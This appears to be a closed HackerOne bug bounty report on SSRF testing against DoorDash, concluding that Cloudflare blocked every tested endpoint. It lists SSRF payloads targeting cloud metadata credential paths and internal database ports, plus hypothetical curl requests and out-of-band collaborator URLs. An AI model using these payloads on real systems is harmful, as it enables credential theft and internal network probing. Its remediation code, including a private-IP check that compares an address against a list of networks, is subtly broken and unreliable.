# SSRF Testing Methodology - DoorDash

**Platform:** HackerOne
**Program:** DoorDash
**Severity:** Informational (CLOSED - Cloudflare Protected)
**Report Date:** 2026-06-06
**Report Type:** Testing Results
**Status:** closed_cloudflare_blocked

---

## ⚠️ Report Status: CLOSED

**TESTING COMPLETE - CLOUDFLARE PROTECTION FOUND**

All DoorDash API endpoints tested returned **403 Forbidden** with Cloudflare protection:

| Endpoint | Result |
|----------|--------|
| `/v1/addresses?url=` | ❌ 403 Cloudflare |
| `/v1/storefeed?url=` | ❌ 403 Cloudflare |
| `/v1/dash_products?url=` | ❌ 403 Cloudflare |
| `/v1/geocoding` (POST) | ❌ 403 Cloudflare |
| `/v1/developer/webhooks/test` | ❌ 403 Cloudflare |
| `/v1/partner/connection_test` | ❌ 404 Not Found |

**Conclusion:** DoorDash's public API infrastructure is protected by Cloudflare, blocking SSRF testing. The only confirmed DoorDash SSRF (HackerOne #2123113) was in a Slack integration feature, not the public API.

**Testing with authentication also blocked:** Even with Bearer token auth, endpoints return 403 Cloudflare.

---

## Summary

Research methodology for discovering SSRF vulnerabilities in DoorDash's infrastructure. Public API documentation does not reveal endpoints accepting arbitrary URL parameters (webhooks configured via portal UI, merchant data via JSON body). However, deeper reconnaissance via mobile app traffic analysis and third-party integration testing may reveal hidden attack surface.

---

## Description

DoorDash's public API architecture uses JSON request bodies for resource management, not URL query parameters. Research findings:

- **Webhook Configuration:** DoorDash manages webhooks via Developer Portal UI (https://developer.doordash.com/en-US/portal), not via API parameters
- **Merchant Logo Updates:** Use request body JSON, not URL parameters
- **Profile Settings:** Standard RESTful endpoints with authentication

**Note:** DoorDash's VDP explicitly lists SSRF as in-scope, particularly focusing on cloud metadata access (AWS 169.254.169.254, GCP). The attack surface exists but requires deeper reconnaissance to find URL-fetching functionality.

**Note:** DoorDash explicitly lists SSRF in their bug bounty scope with focus on metadata service access, indicating they accept SSRF reports with demonstrated impact.

---

## Steps to Reproduce (Methodology)

### Phase 1: Identify Endpoints Accepting URLs

1. Use Burp Suite to proxy traffic from DoorDash app/website
2. Look for parameters accepting URLs:
   - `?url=`
   - `?image=`, `?src=`, `?avatar=`
   - `?callback_url=`
   - `?import_url=`
3. Enumerate all parameters with URL-like values

**Target Areas (for further reconnaissance):**
- Internal/mobile API endpoints not publicly documented
- Third-party integration endpoints (POS systems, aggregators like Otter, Deliverect)
- Legacy API endpoints with different security implementations
- Developer portal webhook registration (check for SSRF in webhook URL handling)

### Phase 2: SSRF Testing Vectors

Test each identified endpoint with these payloads:

```bash
# AWS Metadata (Primary Target)
url=http://169.254.169.254/latest/meta-data/instance-id
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
url=http://metadata.google.internal/computeMetadata/v1/instance/id
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Internal Port Scanning
url=http://10.0.0.1:8080/      # Port 8080
url=http://10.0.0.2:6379/      # Redis
url=http://10.0.0.3:5432/      # PostgreSQL
url=http://localhost:5432/     # Local DB

# Out-of-Band Confirmation
url=http://YOUR_COLLABORATOR.burpcollaborator.net
url=http://YOUR_SUBDOMAIN.burpcloud.net
```

### Phase 3: Verify Exploitation

1. Check response for metadata content (instance IDs, tokens)
2. Monitor Burp Collaborator for DNS/HTTP interactions
3. Document response times for internal port detection
4. Capture actual HTTP responses showing SSRF

---

## PoC (Proof of Concept - Hypothetical)

**⚠️ IMPORTANT:** No actual vulnerable endpoint was identified. The following are testing methodologies for hypothetical SSRF points that would need to be discovered through further reconnaissance.

### Hypothetical Test 1: AWS Metadata Access

*If an endpoint accepting avatar_url or similar parameter is found:*
```bash
curl -X POST "https://doordash.com/api/v1/user/profile" \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/instance-id"}'
```

### Hypothetical Test 2: Burp Collaborator Confirmation

*For confirming any found SSRF:*
```bash
curl -X GET "https://doordash.com/API_ENDPOINT" \
  -d "param=http://COLLABORATOR_ID.oastify.com"
```

### Hypothetical Test 3: Internal Service Detection

*Response time analysis for port detection:*
```bash
curl -X GET "https://doordash.com/API_ENDPOINT?url=http://10.0.0.1:8080/" -w "%{time_total}\n"
```

---

## Impact

**No Impact Demonstrated**

All tested endpoints are protected by Cloudflare, returning 403 Forbidden. No SSRF vulnerability was confirmed.

**DoorDash accepts SSRF reports** per their VDP, but testing requires bypassing Cloudflare protection or authenticated access to internal APIs.

## Affected Attack Surface

| Feature | Attack Vector | Status |
|---------|---------------|--------|
| Developer Portal Webhooks | Callback URL registration | **Low risk** - Portal-based config |
| Merchant Updates | Logo URL in JSON body | **Unknown** - Needs testing |
| Third-party Integrations | POS/aggregator endpoints | **Potential** - Less secured |
| Internal APIs | Mobile app traffic | **Research needed** |

**DoorDash Scope:** `*.doordash.com`, `doordash.com`, `doorDashto.com`, `aws.doordash.com`

**Key Finding:** DoorDash API is protected by Cloudflare at the network level. The only confirmed DoorDash SSRF (#2123113) was in a Slack integration feature, not the public API.

---

## Remediation

### 1. URL Validation with Allowlist

```python
ALLOWED_DOMAINS = [
    'cdn.doordash.com',
    'doordash.com',
    'img.Doordash.com',
    'amazonaws.com',  # If S3 is used
    'googleapis.com'   # If GCS is used
]

ALLOWED_SCHEMES = ['https']  # Block http:// entirely

def validate_avatar_url(url):
    parsed = urlparse(url)
    
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False, "Only HTTPS allowed"
    
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False, "Domain not in allowlist"
    
    return True, "Valid URL"
```

### 2. Block Private IP Ranges

```python
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network('169.254.0.0/16'),  # AWS/GCP metadata
    ipaddress.ip_network('10.0.0.0/8'),       # Private Class A
    ipaddress.ip_network('172.16.0.0/12'),    # Private Class B
    ipaddress.ip_network('192.168.0.0/16'),   # Private Class C
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
]

def is_blocked_ip(hostname):
    try:
        ip = gethostbyname(hostname)
        return ip_address(ip) in BLOCKED_NETWORKS
    except:
        return True  # Block if resolution fails
```

### 3. Safe HTTP Client Configuration

```python
# Use strict timeout and disable redirects
response = requests.get(
    url,
    timeout=3,  # Max 3 second timeout
    allow_redirects=False,
    headers={'User-Agent': 'DoorDash-Security'},
    verify=True
)
```

---

## References

- [DoorDash Bug Bounty Program](https://hackerone.com/doordash)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [Rhino Security Labs - AWS SSRF](https://rhinosecuritylabs.com/aws/aws-ssrf/)
- [HackerOne SSRF Methodology](https://www.hackerone.com/blog/how-to-write-ssrf-reports)

---

## Timeline

- **Date Discovered:** 2026-06-06
- **Date Tested:** 2026-06-06
- **Date Closed:** 2026-06-06
- **Resolution:** Cloudflare protection blocks testing - no vulnerability found
- **Status:** closed_cloudflare_blocked

---

**Conclusion:** DoorDash's API infrastructure is properly protected by Cloudflare. SSRF testing requires authenticated access or finding a Cloudflare-bypassing technique. The confirmed DoorDash SSRF (#2123113) was in a Slack integration, not the main API.

---

**Reporter:** SARAhack
**Platform:** HackerOne
**Program:** DoorDash